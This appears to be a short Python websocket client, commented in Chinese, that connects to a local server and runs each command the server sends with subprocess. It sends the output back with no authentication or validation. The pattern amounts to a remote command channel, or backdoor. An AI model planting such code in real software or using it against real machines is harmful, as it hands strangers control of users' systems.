import asyncio
import subprocess

import websockets

# 向服务器端发送认证后的消息
async def send_msg(websocket):
    _text = None
    while True:
        if _text == "exit":
            print(f'you have enter "exit", goodbye')
            await websocket.close(reason="user exit")
            return False
        if _text:
            await websocket.send(str(_text))
        recv_text = await websocket.recv()
        print(f"{recv_text}")
        res = subprocess.run(recv_text.split("cmd:")[-1], stdout=subprocess.PIPE)
        _text = res.stdout.decode()
# 客户端主逻辑
async def main_logic():
    async with websockets.connect('ws://localhost:8080/send/1') as websocket:
        await send_msg(websocket)

asyncio.get_event_loop().run_until_complete(main_logic())